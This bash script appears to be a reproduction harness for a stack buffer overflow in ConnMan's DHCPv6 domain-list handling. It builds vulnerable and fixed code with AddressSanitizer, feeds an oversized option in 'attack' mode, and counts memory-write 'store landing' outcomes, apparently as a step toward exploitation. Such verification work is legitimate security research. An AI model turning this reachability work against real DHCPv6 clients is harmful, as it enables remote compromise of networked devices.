#!/bin/bash
# CVE-2026-115863 — wire-reply harness.
# Includes VERBATIM dhcpv6_get_option() from pinned tag-2.0 gdhcp/common.c and
# the three VERBATIM client.c functions. Feeds a raw DHCPv6 REPLY-shaped byte
# buffer (option 24, len 2048) through ConnMan's own option parser into
# get_domains(). No socket, daemon, network or full ConnMan build.
export ASAN_OPTIONS=detect_leaks=0
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E"
rm -f "$E"/*.log "$E"/*.out get_option_fn.inc get_domains_fn.inc \
      get_ov_list_fn.inc get_request_fn.inc a-wire a-fixed p-wire
PASS=0
FAIL=0
ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() { if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi; }
hasnt() { if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi; }
srcsha() { sha256sum "$1" | cut -d' ' -f1; }
BASE=../../frontier/connman2shell/src
SRC=$BASE/client-2.0.c
FIX=$BASE/client-2.0-fixed.c
COMMON=$BASE/common-2.0.c

[ "$(srcsha "$SRC")" = 722cccc072d658f6c9fded507e1deab8cd8a8837479c9215c88a4834f81fcb0f ] \
  && ok "pin-2.0-client-sha256" || no "pin-2.0-client-sha256"
[ "$(srcsha "$FIX")" = d252cf019c960a3a9a60501429155cead2876269c79ab1cca7443b787f3c5c0e ] \
  && ok "fixed-client-sha256" || no "fixed-client-sha256"
[ "$(srcsha "$COMMON")" = 2ff01d8b8d8347fad8876092035a3acfc38fb9048b2ea0da8be90c43af73eada ] \
  && ok "pin-2.0-common-sha256" || no "pin-2.0-common-sha256"
[ "$(srcsha driver.c)" = 00805eff86442a9ac3872e8d5fc8605d028a45eb94d80ca42c779a44bbe82a4d ] \
  && ok "driver-sha256" || no "driver-sha256"

ext() { sed -n "$2" "$1"; }
ext "$COMMON" '/^uint8_t \*dhcpv6_get_option/,/^}/p' > /tmp/c2w-option.inc
ext "$SRC" '/^static GList \*get_domains/,/^}/p' > /tmp/c2w-domains.inc
ext "$SRC" '/^static GList \*get_dhcpv6_option_value_list/,/^}/p' > /tmp/c2w-ov.inc
ext "$SRC" '/^static void get_dhcpv6_request/,/^}/p' > /tmp/c2w-req.inc
ext "$FIX" '/^static GList \*get_domains/,/^}/p' > /tmp/c2wf-domains.inc
ext "$FIX" '/^static GList \*get_dhcpv6_option_value_list/,/^}/p' > /tmp/c2wf-ov.inc
ext "$FIX" '/^static void get_dhcpv6_request/,/^}/p' > /tmp/c2wf-req.inc

[ "$(srcsha /tmp/c2w-option.inc)" = d4dd43726a18c8401420283af4c36ed396c0895f181697c03c16bd184ccfccd3 ] \
  && ok "verbatim-dhcpv6_get_option-sha256" || no "verbatim-dhcpv6_get_option-sha256"
[ "$(srcsha /tmp/c2w-domains.inc)" = 090d8ea201196ea32892c95aaeb38d5b2a99c9a8ef41c4d081782b8a6f60a5c2 ] \
  && ok "verbatim-vuln-get_domains-sha256" || no "verbatim-vuln-get_domains-sha256"
[ "$(srcsha /tmp/c2w-ov.inc)" = 0391d8e708902132249ce7e31d1d20bb6cecca7e029b09c9658a7a1950497414 ] \
  && ok "verbatim-get_ov_list-sha256" || no "verbatim-get_ov_list-sha256"
[ "$(srcsha /tmp/c2w-req.inc)" = b38eb6989a74b6dd81465a87a61afe700df24ecea6c90153a6f9e4acf2d4f812 ] \
  && ok "verbatim-get_request-sha256" || no "verbatim-get_request-sha256"
[ "$(srcsha /tmp/c2wf-domains.inc)" = 466360babe68e0cdf7abfa8d5e20c5dd7ad7bea05631ecf0f39f8f531241b0d9 ] \
  && ok "verbatim-fixed-get_domains-sha256" || no "verbatim-fixed-get_domains-sha256"
[ "$(srcsha /tmp/c2wf-ov.inc)" = 0391d8e708902132249ce7e31d1d20bb6cecca7e029b09c9658a7a1950497414 ] \
  && ok "verbatim-fixed-get_ov_list-sha256" || no "verbatim-fixed-get_ov_list-sha256"
[ "$(srcsha /tmp/c2wf-req.inc)" = b38eb6989a74b6dd81465a87a61afe700df24ecea6c90153a6f9e4acf2d4f812 ] \
  && ok "verbatim-fixed-get_request-sha256" || no "verbatim-fixed-get_request-sha256"

CFLAGS="-g -O0 -fno-omit-frame-pointer -fsanitize=address"
build() { # out, option-inc, domains-inc, ov-inc, req-inc
	cp "$2" get_option_fn.inc
	cp "$3" get_domains_fn.inc
	cp "$4" get_ov_list_fn.inc
	cp "$5" get_request_fn.inc
	gcc $CFLAGS -w driver.c -o "$1" 2>"$E/build-$1.log"
}
build a-wire /tmp/c2w-option.inc /tmp/c2w-domains.inc /tmp/c2w-ov.inc /tmp/c2w-req.inc \
  && ok "build-wire-asan" || no "build-wire-asan"
build a-fixed /tmp/c2w-option.inc /tmp/c2wf-domains.inc /tmp/c2wf-ov.inc /tmp/c2wf-req.inc \
  && ok "build-fixed-asan" || no "build-fixed-asan"

cp /tmp/c2w-option.inc get_option_fn.inc
cp /tmp/c2w-domains.inc get_domains_fn.inc
cp /tmp/c2w-ov.inc get_ov_list_fn.inc
cp /tmp/c2w-req.inc get_request_fn.inc
gcc -g -O0 -fno-omit-frame-pointer -DPLAIN -w driver.c -o p-wire \
  2>"$E/build-p-wire.log" && ok "build-wire-plain" || no "build-wire-plain"

# --- reachability: real option parser -> real caller chain -> ASan ---------
./a-wire attack 0x80 >"$E/wire-asan-attack.out" 2>&1; RC=$?
f="$E/wire-asan-attack.out"
[ "$RC" -ne 0 ] && ok "wire-asan-nonzero-exit" || no "wire-asan-nonzero-exit"
has "$f" "ERROR: AddressSanitizer: stack-buffer-overflow" "wire-asan-stack-overflow"
has "$f" "READ of size 1" "wire-asan-read-1"
has "$f" "get_domains" "wire-frame-get_domains"
has "$f" "get_dhcpv6_option_value_list" "wire-frame-get_ov_list"
has "$f" "get_dhcpv6_request" "wire-frame-get_request"
has "$f" "WIREPARSE OLEN=2048 COUNT=1 OFFSET=8" "real-parser-delivers-2048-bytes"
has "$f" "WIRE MODE=attack PKTLEN=2056 LASTJUMP=80" "wire-packet-reaches-chain"

# --- controls: fixed pin and well-formed short DOMAIN_LIST -----------------
./a-fixed attack 0x80 >"$E/fixed-asan-attack.out" 2>&1; FRC=$?
has "$E/fixed-asan-attack.out" "CHAIN DONE STATUS=0" "fixed-wire-clean-done"
hasnt "$E/fixed-asan-attack.out" "AddressSanitizer" "fixed-wire-no-asan"
[ "$FRC" -eq 0 ] && ok "fixed-wire-clean-exit" || no "fixed-wire-clean-exit"

./a-wire safe >"$E/wire-asan-safe.out" 2>&1; SRC_RC=$?
has "$E/wire-asan-safe.out" "WIREPARSE OLEN=8 COUNT=1 OFFSET=8" "safe-parser-olen-8"
has "$E/wire-asan-safe.out" "CHAIN DONE STATUS=0" "vuln-wire-safe-clean-done"
hasnt "$E/wire-asan-safe.out" "AddressSanitizer" "vuln-wire-safe-no-asan"
[ "$SRC_RC" -eq 0 ] && ok "vuln-wire-safe-clean-exit" || no "vuln-wire-safe-clean-exit"

# --- store landing, plain build, 12 repetitions -----------------------------
store=0; none=0; crash=0
for n in $(seq 1 12); do
	o="$E/wire-plain-$n.out"
	./p-wire 0x80 >"$o" 2>&1; r=$?
	if [ "$r" -ne 0 ]; then crash=$((crash + 1)); continue; fi
	d=$(sed -n 's/^CANARY DOTS=\([0-9]*\).*/\1/p' "$o")
	if [ "${d:-0}" -gt 0 ]; then store=$((store + 1)); else none=$((none + 1)); fi
done
printf 'PLAIN_OUTCOMES store=%d none=%d crash=%d total=12\n' "$store" "$none" "$crash"
printf 'OBS outcome mix is ASLR-dependent; no category is a pass criterion.\n'

printf 'SUMMARY=%d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
